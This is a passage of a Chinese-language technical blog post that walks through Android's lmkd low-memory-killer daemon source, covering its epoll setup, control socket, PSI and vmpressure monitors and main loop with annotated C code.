驱动程序中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">mlockall</span>(MCL_CURRENT | MCL_FUTURE | MCL_ONFAULT) &amp;&amp; (errno != EINVAL)) &#123;</span><br><span class="line">    <span class="built_in">ALOGW</span>(<span class="string">&quot;mlockall failed %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>mlockall 函数将调用进程的全部虚拟地址空间加锁。防止出现内存交换，将该进程的地址空间交换到外存上。</li><li>mlockall 将所有映射到进程地址空间的内存上锁。这些页包括： 代码段，数据段，栈段，共享库，共享内存，user space kernel data,memory-mapped file. 当函数成功返回的时候，所有的被映射的页都在内存中。</li><li>flags 可取两个值：MCL_CURRENT,MCL_FUTURE<ul><li>MCL_CURRENT: 表示对所有已经映射到进程地址空间的页上锁</li><li>MCL_FUTURE: 表示对所有将来映射到进程地空间的页都上锁。</li></ul></li><li>函数返回： 成功返回 0，出错返回 - 1</li><li>此函数有两个重要的应用： real-time algorithms (实时算法) 和 high-security data processing (机密数据的处理)<ul><li>real-time algorithms：对时间要非常高。</li></ul></li><li>如果进程执行了一个 execve 类函数，所有的锁都会被删除。</li><li>内存锁不会被子进程继承。</li><li>内存锁不会叠加，即使多次调用 mlockall 函数，只调用一次 munlock 就会解锁</li></ul><h3 id="2-init"><a class="markdownIt-Anchor" href="#2-init">#</a> 2. init</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">//epoll事件</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">epev</span>;</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> ret;  </span><br><span class="line">    page_k = sysconf(_SC_PAGESIZE);</span><br><span class="line">    <span class="keyword">if</span> (page_k == <span class="number">-1</span>)</span><br><span class="line">        page_k = PAGE_SIZE;</span><br><span class="line">    page_k /= <span class="number">1024</span>;</span><br><span class="line">    <span class="comment">//创建epoll文件句柄</span></span><br><span class="line">    epollfd = epoll_create(MAX_EPOLL_EVENTS);</span><br><span class="line">    <span class="keyword">if</span> (epollfd == <span class="number">-1</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;epoll_create failed (errno=%d)&quot;</span>, errno);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取lmkd socket的控制权</span></span><br><span class="line">    ctrl_lfd = android_get_control_socket(<span class="string">&quot;lmkd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ctrl_lfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;get lmkd control socket failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//监听lmkd socket</span></span><br><span class="line">    ret = listen(ctrl_lfd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;lmkd control socket listen failed (errno=%d)&quot;</span>, errno);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="comment">//设置epoll事件的触发方式</span></span><br><span class="line">epev.events = EPOLLIN;</span><br><span class="line"><span class="comment">//设置epoll事件的处理函数</span></span><br><span class="line">epev.data.ptr = (<span class="type">void</span> *)ctrl_connect_handler;</span><br><span class="line"><span class="comment">//在epollfd中添加对lmkd socket文件句柄的监听</span></span><br><span class="line">    <span class="keyword">if</span> (epoll_ctl(epollfd, EPOLL_CTL_ADD, ctrl_lfd, &amp;epev) == <span class="number">-1</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;epoll_ctl for lmkd control socket failed (errno=%d)&quot;</span>, errno);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">maxevents++;</span><br><span class="line"><span class="comment">//判断INKERNEL_MINFREE_PATH是否有写权限，INKERNEL_MINFREE_PATH定义如下：</span></span><br><span class="line"><span class="comment">//#define INKERNEL_MINFRE_PATH </span></span><br><span class="line"><span class="comment">//“/sys/module/lowmemorykiller/parameters/minfree”</span></span><br><span class="line">use_inkernel_interface = !access(INKERNEL_MINFREE_PATH, W_OK);</span><br><span class="line"> <span class="keyword">if</span> (use_inkernel_interface) &#123;</span><br><span class="line">      ALOGI(<span class="string">&quot;Using in-kernel low memory killer interface&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       ret = init_mp(MEMPRESSURE_WATCH_LEVEL, (<span class="type">void</span> *)&amp;mp_event);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">           ALOGE(<span class="string">&quot;Kernel does not support memory pressure events or in-kernel low memory killer&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= ADJTOSLOT(OOM_SCORE_ADJ_MAX); i++) &#123;</span><br><span class="line">        procadjslot_list[i].next = &amp;procadjslot_list[i];</span><br><span class="line">        procadjslot_list[i].prev = &amp;procadjslot_list[i];</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="21-创建epoll"><a class="markdownIt-Anchor" href="#21-创建epoll">#</a> 2.1 创建 epoll</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">epollfd = epoll_create(MAX_EPOLL_EVENTS);</span><br><span class="line">   <span class="keyword">if</span> (epollfd == <span class="number">-1</span>) &#123;</span><br><span class="line">       ALOGE(<span class="string">&quot;epoll_create failed (errno=%d)&quot;</span>, errno);</span><br><span class="line">       <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>整个 lmkd 都是依赖 epoll 机制，这里创建了 9 个 event：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 1 ctrl listen socket, 3 ctrl data socket, 3 memory pressure levels,</span></span><br><span class="line"><span class="comment"> * 1 lmk events + 1 fd to wait for process death</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_EPOLL_EVENTS (1 + MAX_DATA_CONN + VMPRESS_LEVEL_COUNT + 1 + 1)</span></span><br></pre></td></tr></table></figure><h4 id="22-初始化socket-lmkd"><a class="markdownIt-Anchor" href="#22-初始化socket-lmkd">#</a> 2.2 初始化 socket lmkd</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ctrl_sock.sock = android_get_control_socket(<span class="string">&quot;lmkd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (ctrl_sock.sock &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    ALOGE(<span class="string">&quot;get lmkd control socket failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = listen(ctrl_sock.sock, MAX_DATA_CONN);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    ALOGE(<span class="string">&quot;lmkd control socket listen failed (errno=%d)&quot;</span>, errno);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">epev.events = EPOLLIN;</span><br><span class="line">ctrl_sock.handler_info.handler = ctrl_connect_handler;</span><br><span class="line">epev.data.ptr = (<span class="type">void</span> *)&amp;(ctrl_sock.handler_info);</span><br><span class="line"><span class="keyword">if</span> (epoll_ctl(epollfd, EPOLL_CTL_ADD, ctrl_sock.sock, &amp;epev) == <span class="number">-1</span>) &#123;</span><br><span class="line">    ALOGE(<span class="string">&quot;epoll_ctl for lmkd control socket failed (errno=%d)&quot;</span>, errno);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">maxevents++;</span><br></pre></td></tr></table></figure><p>ctrl_sock 主要存储的是 socket lmkd 的 fd 和 handle info，主要注意这里的 ctrl_connect_handler ()</p><p>该函数时 socket /dev/socket/lmkd 有信息时的处理函数，lmkd 的客户端 AMS.mProcessList 会通过 socket /dev/socket/lmkd 与 lmkd 进行通信。</p><h4 id="23-确定是否使用lmk驱动程序"><a class="markdownIt-Anchor" href="#23-确定是否使用lmk驱动程序">#</a> 2.3 确定是否使用 LMK 驱动程序</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> INKERNEL_MINFREE_PATH <span class="string">&quot;/sys/module/lowmemorykiller/parameters/minfree&quot;</span></span></span><br><span class="line"></span><br><span class="line">  has_inkernel_module = !access(INKERNEL_MINFREE_PATH, W_OK);</span><br><span class="line">  use_inkernel_interface = has_inkernel_module;</span><br></pre></td></tr></table></figure><p>通过 <code>access</code>  函数确认旧的节点是否还存在，用于确认 kernel 是否还在使用 LMK 程序（kernel 4.12 已废弃）</p><h4 id="24-init_monitors"><a class="markdownIt-Anchor" href="#24-init_monitors">#</a> 2.4 init_monitors</h4><p>该函数是 init 函数中的核心了，这里用来注册 PSI 的监视器策略（Android11 及以后）或者是 common 的 adj 策略 (vmpressure，Android11 之前)，并将其添加到 epoll 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">init_monitors</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">/* Try to use psi monitor first if kernel has it */</span></span><br><span class="line">    use_psi_monitors = property_get_bool(<span class="string">&quot;ro.lmk.use_psi&quot;</span>, <span class="literal">true</span>) &amp;&amp;</span><br><span class="line">        init_psi_monitors();</span><br><span class="line">    <span class="comment">/* Fall back to vmpressure */</span></span><br><span class="line">    <span class="keyword">if</span> (!use_psi_monitors &amp;&amp;</span><br><span class="line">        (!init_mp_common(VMPRESS_LEVEL_LOW) ||</span><br><span class="line">        !init_mp_common(VMPRESS_LEVEL_MEDIUM) ||</span><br><span class="line">        !init_mp_common(VMPRESS_LEVEL_CRITICAL))) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;Kernel does not support memory pressure events or in-kernel low memory killer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (use_psi_monitors) &#123;</span><br><span class="line">        ALOGI(<span class="string">&quot;Using psi monitors for memory pressure detection&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ALOGI(<span class="string">&quot;Using vmpressure for memory pressure detection&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 如果使用vmpressure，则通过init_mp_common 来初始化kill 策略；</span><br><span class="line">- 如果使用PSI，则通过init_psi_monitors 来初始化kill 策略；</span><br><span class="line"></span><br><span class="line">所以lmkd 中如果使用 PSI ，要求 ro.lmk.use_psi 为 true(注：博主说的其实有点问题，property_get_bool函数中的参数true为默认值，该值不设置即默认返回为true，并不需要设置为true)。</span><br><span class="line"></span><br><span class="line">另外，lmkd 支持旧模式的kill 策略，只要 ro.lmk.use_new_strategy 设为false，或者将ro.lmk.use_minfree_levels 设为true（针对非低内存设备，即ro.config.low_ram 不为true）。</span><br><span class="line"></span><br><span class="line">继续深入分析init_psi_monitors()函数。</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">static bool init_psi_monitors() &#123;</span><br><span class="line">    /*</span><br><span class="line">     * When PSI is used on low-ram devices or on high-end devices without memfree levels</span><br><span class="line">     * use new kill strategy based on zone watermarks, free swap and thrashing stats</span><br><span class="line">     */</span><br><span class="line">    bool use_new_strategy =</span><br><span class="line">        property_get_bool(&quot;ro.lmk.use_new_strategy&quot;, low_ram_device || !use_minfree_levels);</span><br><span class="line"></span><br><span class="line">    /* In default PSI mode override stall amounts using system properties */</span><br><span class="line">    if (use_new_strategy) &#123;</span><br><span class="line">        /* Do not use low pressure level */</span><br><span class="line">        psi_thresholds[VMPRESS_LEVEL_LOW].threshold_ms = 0;</span><br><span class="line">        psi_thresholds[VMPRESS_LEVEL_MEDIUM].threshold_ms = psi_partial_stall_ms;</span><br><span class="line">        psi_thresholds[VMPRESS_LEVEL_CRITICAL].threshold_ms = psi_complete_stall_ms;</span><br><span class="line">    &#125;</span><br><span class="line">    // mp应该时memory pressure的意思</span><br><span class="line">    if (!init_mp_psi(VMPRESS_LEVEL_LOW, use_new_strategy)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!init_mp_psi(VMPRESS_LEVEL_MEDIUM, use_new_strategy)) &#123;</span><br><span class="line">        destroy_mp_psi(VMPRESS_LEVEL_LOW);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!init_mp_psi(VMPRESS_LEVEL_CRITICAL, use_new_strategy)) &#123;</span><br><span class="line">        destroy_mp_psi(VMPRESS_LEVEL_MEDIUM);</span><br><span class="line">        destroy_mp_psi(VMPRESS_LEVEL_LOW);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数比较简单的，最开始的变量 <code>use_new_strategy</code>  用以确认是使用 PSI 策略还是 vmpressure。如果是使用 PSI 策略， <code>psi_thresholds</code>  数组中的 <code>threshold_ms</code>  需要重新赋值为 prop 指定的值（也就是说支持动态配置）。最后通过 <code>init_mp_psi</code>  为每个级别的 strategy 进行最后的注册，当然对于 PSI，只有 some 和 full 等级，所以与 level 中的 medium 和 critical 分别对应。</p><p>这里的 <code>psi_thresholds</code>  数组中 <code>threshold_ms</code>  通过 prop：</p><ul><li>ro.lmk.psi_partial_stall_ms low_ram 默认为 200ms，PSI 默认为 70ms；</li><li>ro.lmk.psi_complete_stall_ms 默认 700ms；</li></ul><p>对于 <code>init_mp_psi</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">init_mp_psi</span><span class="params">(<span class="keyword">enum</span> vmpressure_level level, <span class="type">bool</span> use_new_strategy)</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do not register a handler if threshold_ms is not set */</span></span><br><span class="line">    <span class="keyword">if</span> (!psi_thresholds[level].threshold_ms) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注意这里</span></span><br><span class="line">    fd = init_psi_monitor(psi_thresholds[level].stall_type,</span><br><span class="line">        psi_thresholds[level].threshold_ms * US_PER_MS,</span><br><span class="line">        PSI_WINDOW_SIZE_MS * US_PER_MS);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vmpressure_hinfo[level].handler = use_new_strategy ? mp_event_psi : mp_event_common;</span><br><span class="line">    vmpressure_hinfo[level].data = level;</span><br><span class="line">    <span class="keyword">if</span> (register_psi_monitor(epollfd, fd, &amp;vmpressure_hinfo[level]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        destroy_psi_monitor(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    maxevents++;</span><br><span class="line">    mpevfd[level] = fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过 init_psi_monitor 将不同 level 的值写入节点 /proc/pressure/memory，后期阈值如果超过了设定就会触发一次 epoll；</li><li>根据 use_new_strategy，选择是新策略 mp_event_psi，还是旧模式 mp_event_common，详细的策略见第 8 节和第 10 节；</li><li>通过 register_psi_monitor 将节点 /proc/pressure/memory 添加到 epoll 中监听；</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">mp_event_psi</span><span class="params">(<span class="type">int</span> data, <span class="type">uint32_t</span> events, <span class="keyword">struct</span> polling_params *poll_params)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">reclaim_state</span> &#123;</span></span><br><span class="line">        NO_RECLAIM = <span class="number">0</span>,</span><br><span class="line">        KSWAPD_RECLAIM,</span><br><span class="line">        DIRECT_RECLAIM,</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><h4 id="25-标记进入lmkd流程"><a class="markdownIt-Anchor" href="#25-标记进入lmkd流程">#</a> 2.5 标记进入 lmkd 流程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* let the others know it does support reporting kills */</span></span><br><span class="line">property_set(<span class="string">&quot;sys.lmk.reportkills&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="26-其他初始化"><a class="markdownIt-Anchor" href="#26-其他初始化">#</a> 2.6 其他初始化</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(killcnt_idx, KILLCNT_INVALID_IDX, <span class="keyword">sizeof</span>(killcnt_idx));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * Read zoneinfo as the biggest file we read to create and size the initial</span></span><br><span class="line"><span class="comment">    * read buffer and avoid memory re-allocations during memory pressure</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">if</span> (reread_file(&amp;file_data) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">       ALOGE(<span class="string">&quot;Failed to read %s: %s&quot;</span>, file_data.filename, strerror(errno));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* check if kernel supports pidfd_open syscall */</span></span><br><span class="line">   pidfd = TEMP_FAILURE_RETRY(pidfd_open(getpid(), <span class="number">0</span>));</span><br><span class="line">   <span class="keyword">if</span> (pidfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">       pidfd_supported = (errno != ENOSYS);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       pidfd_supported = <span class="literal">true</span>;</span><br><span class="line">       close(pidfd);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里主要是 <code>reread_file</code>  函数，用来占坑。通过读取  <code>/proc/zoneinfo</code> ，创建一个最大 size 的 buffer，后面的其他节点都直接使用该 buffer，而不用再重新 malloc。详细看 <code>reread_file()</code>  中的 buf 变量。</p><p>另外，通过 <code>sys_pidfd_open</code> ，确定是否支持 <code>pidfd_open</code>  的 syscall。</p><p>至此，init 基本剖析完成，主要：</p><ul><li>创建 epoll，用以监听 9 个 event；</li><li>初始化 <code>socket /dev/socket/lmkd</code> ，并将其添加到 epoll 中；</li><li>根据 prop  <code>ro.lmk.use_psi</code>  确认是否使用 PSI 还是 vmpressure；</li><li>根据 prop  <code>ro.lmk.use_new_strategy</code>  或者通过 prop  <code>ro.lmk.use_minfree_levels</code>  和 prop  <code>ro.config.low_ram</code>  使用 PSI 时的新策略还是旧策略；</li><li>新、旧策略主要体现在 <code>mp_event_psi</code>  和 <code>mp_event_common</code>  处理，而本质都是通过节点  <code>/proc/pressure/memory</code>  获取内存压力是否达到 some/full 指定来确认是否触发 event；</li><li>后期 epoll 触发主要的处理函数是 <code>mp_event_psi</code>  或  <code>mp_event_common</code> ；</li></ul><h3 id="3-mainloop"><a class="markdownIt-Anchor" href="#3-mainloop">#</a> 3. mainloop</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">mainloop</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">//一直循环等待</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">events</span>[<span class="title">maxevents</span>];</span></span><br><span class="line">        <span class="type">int</span> nevents;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        ctrl_dfd_reopened = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//在init方法中，我们已经经lmkd socket的listen事件添加到epollfd中</span></span><br><span class="line">        <span class="comment">//并等待epollfd事件除法</span></span><br><span class="line">        nevents = epoll_wait(epollfd, events, maxevents, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nevents == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (errno == EINTR)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            ALOGE(<span class="string">&quot;epoll_wait failed (errno=%d)&quot;</span>, errno);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//处理listen事件到来</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nevents; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (events[i].events &amp; EPOLLERR)</span><br><span class="line">                ALOGD(<span class="string">&quot;EPOLLERR on event #%d&quot;</span>, i);</span><br><span class="line">            <span class="keyword">if</span> (events[i].data.ptr)</span><br><span class="line">                (*(<span class="type">void</span> (*)(<span class="type">uint32_t</span>))events[i].data.ptr)(events[i].events);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 mainloop 方法中，epoll_wait 在等到 lmkd socket 的 listen 事件到来，然后再调用 event.data.ptr 方法。在 Init 方法中，我们将 event.data.ptr 指向 ctrl_connect_handler 方法。</p><h3 id="4ctrl_connect_handler方法"><a class="markdownIt-Anchor" href="#4ctrl_connect_handler方法">#</a> 4.ctrl_connect_handler 方法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ctrl_connect_handler</span><span class="params">(<span class="type">uint32_t</span> events __unused)</span> &#123;</span><br><span class="line">    <span class="comment">//这里创建了另一个epoll事件</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> alen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">epev</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (ctrl_dfd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        ctrl_data_close();</span><br><span class="line">        ctrl_dfd_reopened = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//接受lmkd 